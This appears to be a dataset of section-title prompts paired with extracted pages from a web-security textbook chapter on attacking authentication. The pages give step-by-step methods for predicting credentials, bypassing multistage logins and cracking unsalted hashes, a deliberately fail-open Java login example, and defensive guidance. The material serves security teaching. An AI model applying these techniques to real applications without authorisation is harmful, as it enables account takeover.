    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 183\nChapter 6 n Attacking Authentication 183\nHACK STEPS\n1. If the application generates usernames, try to obtain several in quick\nsuccession, and determine whether any sequence or pattern can be\ndiscerned.\n2. If it can, extrapolate backwards to obtain a list of possible valid user-\nnames. This can be used as the basis for a brute-force attack against the\nlogin and other attacks where valid usernames are required, such as the\nexploitation of access control flaws (see Chapter 8).\nTRY IT!\nhttp://mdsec.net/auth/169/\nPredictable Initial Passwords\nIn some applications, users are created all at once or in sizeable batches and are\nautomatically assigned initial passwords, which are then distributed to them\nthrough some means. The means of generating passwords may enable an attacker\nto predict the passwords of other application users. This kind of vulnerability is\nmore common on intranet-based corporate applications — for example, where\nevery employee has an account created on her behalf and receives a printed\nnotifi cation of her password.\nIn the most vulnerable cases, all users receive the same password, or one\nclosely derived from their username or job function. In other cases, generated\npasswords may contain sequences that could be identifi ed or guessed with\naccess to a very small sample of initial passwords.\nHACK STEPS\n1. If the application generates passwords, try to obtain several in quick\nsuccession, and determine whether any sequence or pattern can be\ndiscerned.\n2. If it can, extrapolate the pattern to obtain a list of passwords for other\napplication users.\n3. If passwords demonstrate a pattern that can be correlated with user-\nnames, you can try to log in using known or guessed usernames and the\ncorresponding inferred passwords.\n4. Otherwise, you can use the list of inferred passwords as the basis for a\nbrute-force attack with a list of enumerated or common usernames.\ncc0066..iinndddd 118833 88//1199//22001111 1122::0066::4400 PPMM"
  },
  {
    "input": "Insecure Distribution of Credentials",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 184\n184 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/172/\nInsecure Distribution of Credentials\nMany applications employ a process in which credentials for newly created accounts\nare distributed to users out-of-band of their normal interaction with the applica-\ntion (for example, via post, e-mail, or SMS text message). Sometimes, this is done\nfor reasons motivated by security concerns, such as to provide assurance that\nthe postal or e-mail address supplied by the user actually belongs to that person.\nIn some cases, this process can present a security risk. For example, suppose\nthat the message distributed contains both username and password, there is\nno time limit on their use, and there is no requirement for the user to change\nthe password on fi rst login. It is highly likely that a large number, even the\nmajority, of application users will not modify their initial credentials and that\nthe distribution messages will remain in existence for a lengthy period, during\nwhich they may be accessed by an unauthorized party.\nSometimes, what is distributed is not the credentials themselves, but rather\nan “account activation” URL, which enables users to set their own initial pass-\nword. If the series of these URLs sent to successive users manifests any kind of\nsequence, an attacker can identify this by registering multiple users in close suc-\ncession and then infer the activation URLs sent to recent and forthcoming users.\nA related behavior by some web applications is to allow new users to register\naccounts in a seemingly secure manner and then to send a welcome e-mail to\neach new user containing his full login credentials. In the worst case, a security-\nconscious user who decides to immediately change his possibly compromised\npassword then receives another e-mail containing the new password “for future\nreference.” This behavior is so bizarre and unnecessary that users would be\nwell advised to stop using web applications that indulge in it.\nHACK STEPS\n1. Obtain a new account. If you are not required to set all credentials during\nregistration, determine the means by which the application distributes\ncredentials to new users.\n2. If an account activation URL is used, try to register several new accounts\nin close succession, and identify any sequence in the URLs you receive.\nIf a pattern can be determined, try to predict the activation URLs sent to\nrecent and forthcoming users, and attempt to use these URLs to take own-\nership of their accounts.\n3. Try to reuse a single activation URL multiple times, and see if the applica-\ntion allows this. If not, try locking out the target account before reusing\nthe URL, and see if it now works.\ncc0066..iinndddd 118844 88//1199//22001111 1122::0066::4400 PPMM"
  },
  {
    "input": "Fail-Open Login Mechanisms",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 185\nChapter 6 n Attacking Authentication 185\nImplementation Flaws in Authentication\nEven a well-designed authentication mechanism may be highly insecure due to\nmistakes made in its implementation. These mistakes may lead to information\nleakage, complete login bypassing, or a weakening of the overall security of\nthe mechanism as designed. Implementation fl aws tend to be more subtle and\nharder to detect than design defects such as poor-quality passwords and brute-\nforcibility. For this reason, they are often a fruitful target for attacks against\nthe most security-critical applications, where numerous threat models and\npenetration tests are likely to have claimed any low-hanging fruit. The authors\nhave identifi ed each of the implementation fl aws described here within the web\napplications deployed by large banks.\nFail-Open Login Mechanisms\nFail-open logic is a species of logic fl aw (described in detail in Chapter 11) that has\nparticularly serious consequences in the context of authentication mechanisms.\nThe following is a fairly contrived example of a login mechanism that fails\nopen. If the call to db.getUser() throws an exception for some reason (for\nexample, a null pointer exception arising because the user’s request did not\ncontain a username or password parameter), the login succeeds. Although the\nresulting session may not be bound to a particular user identity and therefore\nmay not be fully functional, this may still enable an attacker to access some\nsensitive data or functionality.\npublic Response checkLogin(Session session) {\ntry {\nString uname = session.getParameter(“username”);\nString passwd = session.getParameter(“password”);\nUser user = db.getUser(uname, passwd);\nif (user == null) {\n// invalid credentials\nsession.setMessage(“Login failed. “);\nreturn doLogin(session);\n}\n}\ncatch (Exception e) {}\n// valid user\nsession.setMessage(“Login successful. “);\nreturn doMainMenu(session);\n}\nIn the fi eld, you would not expect code like this to pass even the most cursory\nsecurity review. However, the same conceptual fl aw is much more likely to exist\nin more complex mechanisms in which numerous layered method invocations\ncc0066..iinndddd 118855 88//1199//22001111 1122::0066::4400 PPMM"
  },
  {
    "input": "Defects in Multistage Login Mechanisms",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 186\n186 Chapter 6 n Attacking Authentication\nare made, in which many potential errors may arise and be handled in different\nplaces, and where the more complicated validation logic may involve maintain-\ning signifi cant state about the login’s progress.\nHACK STEPS\n1. Perform a complete, valid login using an account you control. Record\nevery piece of data submitted to the application, and every response\nreceived, using your intercepting proxy.\n2. Repeat the login process numerous times, modifying pieces of the data\nsubmitted in unexpected ways. For example, for each request parameter\nor cookie sent by the client, do the following:\na. Submit an empty string as the value.\nb. Remove the name/value pair altogether.\nc. Submit very long and very short values.\nd. Submit strings instead of numbers and vice versa.\ne. Submit the same item multiple times, with the same and different\nvalues.\n3. For each malformed request submitted, review closely the application’s\nresponse to identify any divergences from the base case.\n4. Feed these observations back into framing your test cases. When one\nmodification causes a change in behavior, try to combine this with other\nchanges to push the application’s logic to its limits.\nTRY IT!\nhttp://mdsec.net/auth/300/\nDefects in Multistage Login Mechanisms\nSome applications use elaborate login mechanisms involving multiple stages,\nsuch as the following:\nn Entry of a username and password\nn A challenge for specifi c digits from a PIN or a memorable word\nn The submission of a value displayed on a changing physical token\nMultistage login mechanisms are designed to provide enhanced security over\nthe simple model based on username and password. Typically, the fi rst stage\nrequires the users to identify themselves with a username or similar item, and\nsubsequent stages perform various authentication checks. Such mechanisms\ncc0066..iinndddd 118866 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 187\nChapter 6 n Attacking Authentication 187\nfrequently contain security vulnerabilities — in particular, various logic fl aws\n(see Chapter 11).\nCOMMON MYTH\nIt is often assumed that multistage login mechanisms are less prone to secu-\nrity bypasses than standard username/password authentication. This belief\nis mistaken. Performing several authentication checks may add considerable\nsecurity to the mechanism. But counterbalancing this, the process is more\nprone to fl aws in implementation. In several cases where a combination of\nfl aws is present, it can even result in a solution that is less secure than a nor-\nmal login based on username and password.\nSome implementations of multistage login mechanisms make potentially\nunsafe assumptions at each stage about the user’s interaction with earlier stages:\nn An application may assume that a user who accesses stage three must\nhave cleared stages one and two. Therefore, it may authenticate an attacker\nwho proceeds directly from stage one to stage three and correctly com-\npletes it, enabling an attacker to log in with only one part of the various\ncredentials normally required.\nn An application may trust some of the data being processed at stage two\nbecause this was validated at stage one. However, an attacker may be able\nto manipulate this data at stage two, giving it a different value than was\nvalidated at stage one. For example, at stage one the application might\ndetermine whether the user’s account has expired, is locked out, or is in\nthe administrative group, or whether it needs to complete further stages\nof the login beyond stage two. If an attacker can interfere with these\nfl ags as the login transitions between different stages, he may be able to\nmodify the application’s behavior and cause it to authenticate him with\nonly partial credentials or otherwise elevate privileges.\nn An application may assume that the same user identity is used to complete\neach stage; however, it might not explicitly check this. For example, stage\none might involve submitting a valid username and password, and stage\ntwo might involve resubmitting the username (now in a hidden form\nfi eld) and a value from a changing physical token. If an attacker submits\nvalid data pairs at each stage, but for different users, the application might\nauthenticate the user as either one of the identities used in the two stages.\nThis would enable an attacker who possesses his own physical token and\ndiscovers another user’s password to log in as that user (or vice versa).\nAlthough the login mechanism cannot be completely compromised with-\nout any prior information, its overall security posture is substantially\nweakened, and the substantial expense and effort of implementing the\ntwo-factor mechanism do not deliver the benefi ts expected.\ncc0066..iinndddd 118877 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 188\n188 Chapter 6 n Attacking Authentication\nHACK STEPS\n1. Perform a complete, valid login using an account you control. Record every\npiece of data submitted to the application using your intercepting proxy.\n2. Identify each distinct stage of the login and the data that is collected at\neach stage. Determine whether any single piece of information is collected\nmore than once or is ever transmitted back to the client and resubmitted\nvia a hidden form field, cookie, or preset URL parameter (see Chapter 5).\n3. Repeat the login process numerous times with various malformed\nrequests:\na. Try performing the login steps in a different sequence.\nb. Try proceeding directly to any given stage and continuing from there.\nc. Try skipping each stage and continuing with the next.\nd. Use your imagination to think of other ways to access the different\nstages that the developers may not have anticipated.\n4. If any data is submitted more than once, try submitting a different value\nat different stages, and see whether the login is still successful. It may\nbe that some of the submissions are superfluous and are not actually\nprocessed by the application. It might be that the data is validated at one\nstage and then trusted subsequently. In this instance, try to provide the\ncredentials of one user at one stage, and then switch at the next to actu-\nally authenticate as a different user. It might be that the same piece of\ndata is validated at more than one stage, but against different checks. In\nthis instance, try to provide (for example) the username and password of\none user at the first stage, and the username and PIN of a different user\nat the second stage.\n5. Pay close attention to any data being transmitted via the client that was\nnot directly entered by the user. The application may use this data to store\ninformation about the state of the login progress, and the application may\ntrust it when it is submitted back to the server. For example, if the request\nfor stage three includes the parameter stage2complete=true, it may\nbe possible to advance straight to stage three by setting this value. Try to\nmodify the values being submitted, and determine whether this enables\nyou to advance or skip stages.\nTRY IT!\nhttp://mdsec.net/auth/195/\nhttp://mdsec.net/auth/199/\nhttp://mdsec.net/auth/203/\nhttp://mdsec.net/auth/206/\nhttp://mdsec.net/auth/211/\ncc0066..iinndddd 118888 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 189\nChapter 6 n Attacking Authentication 189\nSome login mechanisms employ a randomly varying question at one of the stages\nof the login process. For example, after submitting a username and password, users\nmight be asked one of various “secret” questions (regarding their mother’s maiden\nname, place of birth, name of fi rst school) or to submit two random letters from a\nsecret phrase. The rationale for this behavior is that even if an attacker captures\neverything that a user enters on a single occasion, this will not enable him to log\nin as that user on a different occasion, because different questions will be asked.\nIn some implementations, this functionality is broken and does not achieve\nits objectives:\nn The application may present a randomly chosen question and store the\ndetails within a hidden HTML form fi eld or cookie, rather than on the\nserver. The user subsequently submits both the answer and the question\nitself. This effectively allows an attacker to choose which question to\nanswer, enabling the attacker to repeat a login after capturing a user’s\ninput on a single occasion.\nn The application may present a randomly chosen question on each login\nattempt but not remember which question a given user was asked if he\nor she fails to submit an answer. If the same user initiates a fresh login\nattempt a moment later, a different random question is generated. This\neffectively allows an attacker to cycle through questions until he receives\none to which he knows the answer, enabling him to repeat a login having\ncaptured a user’s input on a single occasion.\nNOTE The second of these conditions is really quite subtle, and as a result,\nmany real-world applications are vulnerable. An application that challenges a\nuser for two random letters of a memorable word may appear at fi rst glance\nto be functioning properly and providing enhanced security. However, if the\nletters are randomly chosen each time the previous authentication stage is\npassed, an attacker who has captured a user’s login on a single occasion can\nsimply reauthenticate up to this point until the two letters that he knows are\nrequested, without the risk of account lockout.\nHACK STEPS\n1. If one of the login stages uses a randomly varying question, verify whether\nthe details of the question are being submitted together with the answer.\nIf so, change the question, submit the correct answer associated with that\nquestion, and verify whether the login is still successful.\n2. If the application does not enable an attacker to submit an arbitrary\nquestion and answer, perform a partial login several times with a single\naccount, proceeding each time as far as the varying question. If the ques-\ntion changes on each occasion, an attacker can still effectively choose\nwhich question to answer.\ncc0066..iinndddd 118899 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Insecure Storage of Credentials",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 190\n190 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/178/\nhttp://mdsec.net/auth/182/\nNOTE In some applications where one component of the login varies ran-\ndomly, the application collects all of a user’s credentials at a single stage.\nFor example, the main login page may present a form containing fi elds for\nusername, password, and one of various secret questions. Each time the\nlogin page is loaded, the secret question changes. In this situation, the ran-\ndomness of the secret question does nothing to prevent an attacker from\nreplaying a valid login request having captured a user’s input on one occa-\nsion. The login process cannot be modifi ed to do so in its present form,\nbecause an attacker can simply reload the page until he receives the varying\nquestion to which he knows the answer. In a variation on this scenario, the\napplication may set a persistent cookie to “ensure” that the same varying\nquestion is presented to any given user until that person answers it cor-\nrectly. Of course, this measure can be circumvented easily by modifying or\ndeleting the cookie.\nInsecure Storage of Credentials\nIf an application stores login credentials insecurely, the security of the login\nmechanism is undermined, even though there may be no inherent fl aw in the\nauthentication process itself.\nIt is common to encounter web applications in which user credentials are\nstored insecurely within the database. This may involve passwords being\nstored in cleartext. But if passwords are being hashed using a standard algo-\nrithm such as MD5 or SHA-1, this still allows an attacker to simply look up\nobserved hashes against a precomputed database of hash values. Because the\ndatabase account used by the application must have full read/write access to\nthose credentials, many other kinds of vulnerabilities within the application\nmay be exploitable to enable you to access these credentials, such as command\nor SQL injection fl aws (see Chapter 9) and access control weaknesses (see\nChapter 8).\nTIP Some online databases of common hashing functions are available here:\nhttp://passcracking.com/index.php\nhttp://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/\nscript-hash-md5.php\ncc0066..iinndddd 119900 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Securing Authentication",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 191\nChapter 6 n Attacking Authentication 191\nHACK STEPS\n1. Review all of the application’s authentication-related functionality, as well\nas any functions relating to user maintenance. If you find any instances in\nwhich a user’s password is transmitted back to the client, this indicates\nthat passwords are being stored insecurely, either in cleartext or using\nreversible encryption.\n2. If any kind of arbitrary command or query execution vulnerability is\nidentified within the application, attempt to find the location within the\napplication’s database or filesystem where user credentials are stored:\na. Query these to determine whether passwords are being stored in\nunencrypted form.\nb. If passwords are stored in hashed form, check for nonunique val-\nues, indicating that an account has a common or default password\nassigned, and that the hashes are not being salted.\nc. If the password is hashed with a standard algorithm in unsalted form,\nquery online hash databases to determine the corresponding cleartext\npassword value.\nSecuring Authentication\nImplementing a secure authentication solution involves attempting to simultane-\nously meet several key security objectives, and in many cases trade off against\nother objectives such as functionality, usability, and total cost. In some cases\n“more” security can actually be counterproductive. For example, forcing users\nto set very long passwords and change them frequently often causes users to\nwrite down their passwords.\nBecause of the enormous variety of possible authentication vulnerabilities,\nand the potentially complex defenses that an application may need to deploy to\nmitigate against all of them, many application designers and developers choose\nto accept certain threats as a given and concentrate on preventing the most seri-\nous attacks. Here are some factors to consider in striking an appropriate balance:\nn The criticality of security given the functionality that the application offers\nn The degree to which users will tolerate and work with different types of\nauthentication controls\nn The cost of supporting a less user-friendly system\nn The fi nancial cost of competing alternatives in relation to the revenue likely\nto be generated by the application or the value of the assets it protects\ncc0066..iinndddd 119911 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Handle Credentials Secretively",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 192\n192 Chapter 6 n Attacking Authentication\nThis section describes the most effective ways to defeat the various attacks\nagainst authentication mechanisms. We’ll leave it to you to decide which kinds\nof defenses are most appropriate in each case.\nUse Strong Credentials\nn Suitable minimum password quality requirements should be enforced.\nThese may include rules regarding minimum length; the appearance of\nalphabetic, numeric, and typographic characters; the appearance of both\nuppercase and lowercase characters; the avoidance of dictionary words,\nnames, and other common passwords; preventing a password from being\nset to the username; and preventing a similarity or match with previ-\nously set passwords. As with most security measures, different password\nquality requirements may be appropriate for different categories of user.\nn Usernames should be unique.\nn Any system-generated usernames and passwords should be created\nwith suffi cient entropy that they cannot feasibly be sequenced or pre-\ndicted — even by an attacker who gains access to a large sample of suc-\ncessively generated instances.\nn Users should be permitted to set suffi ciently strong passwords. For example,\nlong passwords and a wide range of characters should be allowed.\nHandle Credentials Secretively\nn All credentials should be created, stored, and transmitted in a manner\nthat does not lead to unauthorized disclosure.\nn All client-server communications should be protected using a well-\nestablished cryptographic technology, such as SSL. Custom solutions\nfor protecting data in transit are neither necessary nor desirable.\nn If it is considered preferable to use HTTP for the unauthenticated areas of\nthe application, ensure that the login form itself is loaded using HTTPS,\nrather than switching to HTTPS at the point of the login submission.\nn OnlyPOST requests should be used to transmit credentials to the server.\nCredentials should never be placed in URL parameters or cookies (even\nephemeral ones). Credentials should never be transmitted back to the\nclient, even in parameters to a redirect.\nn All server-side application components should store credentials in a man-\nner that does not allow their original values to be easily recovered, even\nby an attacker who gains full access to all the relevant data within the\ncc0066..iinndddd 119922 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Validate Credentials Properly",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 193\nChapter 6 n Attacking Authentication 193\napplication’s database. The usual means of achieving this objective is to\nuse a strong hash function (such as SHA-256 at the time of this writing),\nappropriately salted to reduce the effectiveness of precomputed offl ine\nattacks. The salt should be specifi c to the account that owns the password,\nsuch that an attacker cannot replay or substitute hash values.\nn Client-side “remember me” functionality should in general remember only\nnonsecret items such as usernames. In less security-critical applications,\nit may be considered appropriate to allow users to opt in to a facility to\nremember passwords. In this situation, no cleartext credentials should be\nstored on the client (the password should be stored reversibly encrypted\nusing a key known only to the server). Also, users should be warned about\nrisks from an attacker who has physical access to their computer or who\ncompromises their computer remotely. Particular attention should be paid\nto eliminating cross-site scripting vulnerabilities within the application\nthat may be used to steal stored credentials (see Chapter 12).\nn A password change facility should be implemented (see the “Prevent\nMisuse of the Password Change Function” section), and users should be\nrequired to change their password periodically.\nn Where credentials for new accounts are distributed to users out-of-band,\nthese should be sent as securely as possible and should be time-limited.\nThe user should be required to change them on fi rst login and should be\ntold to destroy the communication after fi rst use.\nn Where applicable, consider capturing some of the user’s login information\n(for example, single letters from a memorable word) using drop-down\nmenus rather than text fi elds. This will prevent any keyloggers installed\non the user’s computer from capturing all the data the user submits. (Note,\nhowever, that a simple keylogger is only one means by which an attacker\ncan capture user input. If he or she has already compromised a user’s\ncomputer, in principle an attacker can log every type of event, including\nmouse movements, form submissions over HTTPS, and screen captures.)\nValidate Credentials Properly\nn Passwords should be validated in full — that is, in a case-sensitive way,\nwithout fi ltering or modifying any characters, and without truncating\nthe password.\nn The application should be aggressive in defending itself against unex-\npected events occurring during login processing. For example, depending\non the development language in use, the application should use catch-all\nexception handlers around all API calls. These should explicitly delete all\ncc0066..iinndddd 119933 88//1199//22001111 1122::0066::4411 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 194\n194 Chapter 6 n Attacking Authentication\nsession and method-local data being used to control the state of the login\nprocessing and should explicitly invalidate the current session, thereby\ncausing a forced logout by the server even if authentication is somehow\nbypassed.\nn All authentication logic should be closely code-reviewed, both as pseudo-\ncode and as actual application source code, to identify logic errors such\nas fail-open conditions.\nn If functionality to support user impersonation is implemented, this should\nbe strictly controlled to ensure that it cannot be misused to gain unau-\nthorized access. Because of the criticality of the functionality, it is often\nworthwhile to remove this functionality from the public-facing applica-\ntion and implement it only for internal administrative users, whose use\nof impersonation should be tightly controlled and audited.\nn Multistage logins should be strictly controlled to prevent an attacker from\ninterfering with the transitions and relationships between the stages:\nn All data about progress through the stages and the results of previous\nvalidation tasks should be held in the server-side session object and\nshould never be transmitted to or read from the client.\nn No items of information should be submitted more than once by the\nuser, and there should be no means for the user to modify data that\nhas already been collected and/or validated. Where an item of data\nsuch as a username is used at multiple stages, this should be stored\nin a session variable when fi rst collected and referenced from there\nsubsequently.\nn The fi rst task carried out at every stage should be to verify that all\nprior stages have been correctly completed. If this is not the case, the\nauthentication attempt should immediately be marked as bad.\nn To prevent information leakage about which stage of the login failed\n(which would enable an attacker to target each stage in turn), the appli-\ncation should always proceed through all stages of the login, even\nif the user failed to complete earlier stages correctly, and even if the\noriginal username was invalid. After proceeding through all the stages,\nthe application should present a generic “login failed” message at the\nconclusion of the fi nal stage, without providing any information about\nwhere the failure occurred.\nn Where a login process includes a randomly varying question, ensure that\nan attacker cannot effectively choose his own question:\nn Always employ a multistage process in which users identify themselves\nat an initial stage and the randomly varying question is presented to\nthem at a later stage.\ncc0066..iinndddd 119944 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Prevent Information Leakage",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 195\nChapter 6 n Attacking Authentication 195\nn When a given user has been presented with a given varying question,\nstore that question within her persistent user profi le, and ensure that\nthe same user is presented with the same question on each attempted\nlogin until she successfully answers it.\nn When a randomly varying challenge is presented to the user, store the\nquestion that has been asked in a server-side session variable, rather\nthan a hidden fi eld in an HTML form, and validate the subsequent\nanswer against that saved question.\nNOTE The subtleties of devising a secure authentication mechanism run\ndeep here. If care is not taken in the asking of a randomly varying question,\nthis can lead to new opportunities for username enumeration. For example, to\nprevent an attacker from choosing his own question, an application may store\nwithin each user’s profi le the last question that user was asked, and continue\npresenting that question until the user answers it correctly. An attacker who\ninitiates several logins using any given user’s username will be met with the\nsame question. However, if the attacker carries out the same process using\nan invalid username, the application may behave differently: because no\nuser profi le is associated with an invalid username, there will be no stored\nquestion, so a varying question will be presented. The attacker can use this\ndifference in behavior, manifested across several login attempts, to infer the\nvalidity of a given username. In a scripted attack, he will be able to harvest\nnumerous usernames quickly.\nIf an application wants to defend itself against this possibility, it must go to\nsome lengths. When a login attempt is initiated with an invalid username, the\napplication must record somewhere the random question that it presented\nfor that invalid username and ensure that subsequent login attempts using\nthe same username are met with the same question. Going even further, the\napplication could switch to a different question periodically to simulate the\nnonexistent user’s having logged in as normal, resulting in a change in the\nnext question! At some point, however, the application designer must draw a\nline and concede that a total victory against such a determined attacker prob-\nably is not possible.\nPrevent Information Leakage\nn The various authentication mechanisms used by the application should\nnot disclose any information about authentication parameters, through\neither overt messages or inference from other aspects of the application’s\nbehavior. An attacker should have no means of determining which piece\nof the various items submitted has caused a problem.\nn A single code component should be responsible for responding to all failed\nlogin attempts with a generic message. This avoids a subtle vulnerability\ncc0066..iinndddd 119955 88//1199//22001111 1122::0066::4411 PPMM"
  },
  {
    "input": "Prevent Brute-Force Attacks",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 196\n196 Chapter 6 n Attacking Authentication\nthat can occur when a supposedly uninformative message returned from\ndifferent code paths can actually be spotted by an attacker due to typo-\ngraphical differences in the message, different HTTP status codes, other\ninformation hidden in HTML, and the like.\nn If the application enforces some kind of account lockout to prevent brute-\nforce attacks (as discussed in the next section), be careful not to let this\nlead to any information leakage. For example, if an application discloses\nthat a specifi c account has been suspended for X minutes due to Y failed\nlogins, this behavior can easily be used to enumerate valid usernames. In\naddition, disclosing the precise metrics of the lockout policy enables an\nattacker to optimize any attempt to continue guessing passwords in spite\nof the policy. To avoid enumeration of usernames, the application should\nrespond to any series of failed login attempts from the same browser with a\ngeneric message advising that accounts are suspended if multiple failures\noccur and that the user should try again later. This can be achieved using a\ncookie or hidden fi eld to track repeated failures originating from the same\nbrowser. (Of course, this mechanism should not be used to enforce any\nactual security control — only to provide a helpful message to ordinary\nusers who are struggling to remember their credentials.)\nn If the application supports self-registration, it can prevent this function\nfrom being used to enumerate existing usernames in two ways:\nn Instead of permitting self-selection of usernames, the application can\ncreate a unique (and unpredictable) username for each new user, thereby\nobviating the need to disclose that a selected username already exists.\nn The application can use e-mail addresses as usernames. Here, the\nfi rst stage of the registration process requires the user to enter her\ne-mail address, whereupon she is told simply to wait for an e-mail\nand follow the instructions contained within it. If the e-mail address\nis already registered, the user can be informed of this in the e-mail. If\nthe address is not already registered, the user can be provided with a\nunique, unguessable URL to visit to continue the registration process.\nThis prevents the attacker from enumerating valid usernames (unless\nhe happens to have already compromised a large number of e-mail\naccounts).\nPrevent Brute-Force Attacks\nn Measures need to be enforced within all the various challenges imple-\nmented by the authentication functionality to prevent attacks that attempt\nto meet those challenges using automation. This includes the login itself,\ncc0066..iinndddd 119966 88//1199//22001111 1122::0066::4411 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 197\nChapter 6 n Attacking Authentication 197\nas well as functions to change the password, to recover from a forgotten\npassword situation, and the like.\nn Using unpredictable usernames and preventing their enumeration presents\na signifi cant obstacle to completely blind brute-force attacks and requires\nan attacker to have somehow discovered one or more specifi c usernames\nbefore mounting an attack.\nn Some security-critical applications (such as online banks) simply disable\nan account after a small number of failed logins (such as three). They also\nrequire that the account owner take various out-of-band steps to reactivate\nthe account, such as telephoning customer support and answering a series\nof security questions. Disadvantages of this policy are that it allows an\nattacker to deny service to legitimate users by repeatedly disabling their\naccounts, and the cost of providing the account recovery service. A more\nbalanced policy, suitable for most security-aware applications, is to sus-\npend accounts for a short period (such as 30 minutes) following a small\nnumber of failed login attempts (such as three). This serves to massively\nslow down any password-guessing attack, while mitigating the risk of\ndenial-of-service attacks and also reducing call center work.\nn If a policy of temporary account suspension is implemented, care should\nbe taken to ensure its effectiveness:\nn To prevent information leakage leading to username enumeration, the\napplication should never indicate that any specifi c account has been\nsuspended. Rather, it should respond to any series of failed logins,\neven those using an invalid username, with a message advising that\naccounts are suspended if multiple failures occur and that the user\nshould try again later (as just discussed).\nn The policy’s metrics should not be disclosed to users. Simply telling\nlegitimate users to “try again later” does not seriously diminish their\nquality of service. But informing an attacker exactly how many failed\nattempts are tolerated, and how long the suspension period is, enables\nhim to optimize any attempt to continue guessing passwords in spite\nof the policy.\nn If an account is suspended, login attempts should be rejected without\neven checking the credentials. Some applications that have imple-\nmented a suspension policy remain vulnerable to brute-forcing because\nthey continue to fully process login attempts during the suspension\nperiod, and they return a subtly (or not so subtly) different mes-\nsage when valid credentials are submitted. This behavior enables\nan effective brute-force attack to proceed at full speed regardless of\nthe suspension policy.\ncc0066..iinndddd 119977 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 198\n198 Chapter 6 n Attacking Authentication\nn Per-account countermeasures such as account lockout do not help protect\nagainst one kind of brute-force attack that is often highly effective — iterat-\ning through a long list of enumerated usernames, checking a single weak\npassword, such as password. For example, if fi ve failed attempts trigger\nan account suspension, this means an attacker can attempt four different\npasswords on every account without causing any disruption to users. In\na typical application containing many weak passwords, such an attacker\nis likely to compromise many accounts.\nThe effectiveness of this kind of attack will, of course, be massively reduced\nif other areas of the authentication mechanism are designed securely. If\nusernames cannot be enumerated or reliably predicted, an attacker will\nbe slowed down by the need to perform a brute-force exercise in guessing\nusernames. And if strong requirements are in place for password quality,\nit is far less likely that the attacker will choose a password for testing that\neven a single user of the application has chosen.\nIn addition to these controls, an application can specifi cally protect itself\nagainst this kind of attack through the use of CAPTCHA (Completely\nAutomated Public Turing test to tell Computers and Humans Apart)\nchallenges on every page that may be a target for brute-force attacks (see\nFigure 6-9). If effective, this measure can prevent any automated submission\nof data to any application page, thereby keeping all kinds of password-\nguessing attacks from being executed manually. Note that much research\nhas been done on CAPTCHA technologies, and automated attacks against\nthem have in some cases been reliable. Furthermore, some attackers have\nbeen known to devise CAPTCHA-solving competitions, in which unwit-\nting members of the public are leveraged as drones to assist the attacker.\nHowever, even if a particular kind of challenge is not entirely effective, it\nwill still lead most casual attackers to desist and fi nd an application that\ndoes not employ the technique.\nFigure 6-9: A CAPTCHA control\ndesigned to hinder automated attacks\nTIP If you are attacking an application that uses CAPTCHA controls to hin-\nder automation, always closely review the HTML source for the page where\nthe image appears. The authors have encountered cases where the solution\ncc0066..iinndddd 119988 88//1199//22001111 1122::0066::4422 PPMM"
  },
  {
    "input": "Prevent Misuse of the Account Recovery Function",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 199\nChapter 6 n Attacking Authentication 199\nto the puzzle appears in literal form within the ALT attribute of the image\ntag, or within a hidden form fi eld, enabling a scripted attack to defeat the\nprotection without actually solving the puzzle itself.\nPrevent Misuse of the Password Change Function\nn A password change function should always be implemented, to allow\nperiodic password expiration (if required) and to allow users to change\npasswords if they want to for any reason. As a key security mechanism,\nthis needs to be well defended against misuse.\nn The function should be accessible only from within an authenticated session.\nn There should be no facility to provide a username, either explicitly or via\na hidden form fi eld or cookie. Users have no legitimate need to attempt\nto change other people’s passwords.\nn As a defense-in-depth measure, the function should be protected from\nunauthorized access gained via some other security defect in the applica-\ntion — such as a session-hijacking vulnerability, cross-site scripting, or\neven an unattended terminal. To this end, users should be required to\nreenter their existing password.\nn The new password should be entered twice to prevent mistakes. The appli-\ncation should compare the “new password” and “confi rm new password”\nfi elds as its fi rst step and return an informative error if they do not match.\nn The function should prevent the various attacks that can be made against\nthe main login mechanism. A single generic error message should be used\nto notify users of any error in existing credentials, and the function should\nbe temporarily suspended following a small number of failed attempts\nto change the password.\nn Users should be notifi ed out-of-band (such as via e-mail) that their pass-\nword has been changed, but the message should not contain either their\nold or new credentials.\nPrevent Misuse of the Account Recovery Function\nn In the most security-critical applications, such as online banking, account\nrecovery in the event of a forgotten password is handled out-of-band. A\nuser must make a telephone call and answer a series of security questions,\nand new credentials or a reactivation code are also sent out-of-band (via\nconventional mail) to the user’s registered home address. The majority of\napplications do not want or need this level of security, so an automated\nrecovery function may be appropriate.\ncc0066..iinndddd 119999 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 200\n200 Chapter 6 n Attacking Authentication\nn A well-designed password recovery mechanism needs to prevent accounts\nfrom being compromised by an unauthorized party and minimize any\ndisruption to legitimate users.\nn Features such as password “hints” should never be used, because they\nmainly help an attacker trawl for accounts that have obvious hints set.\nn The best automated solution for enabling users to regain control of accounts\nis to e-mail the user a unique, time-limited, unguessable, single-use 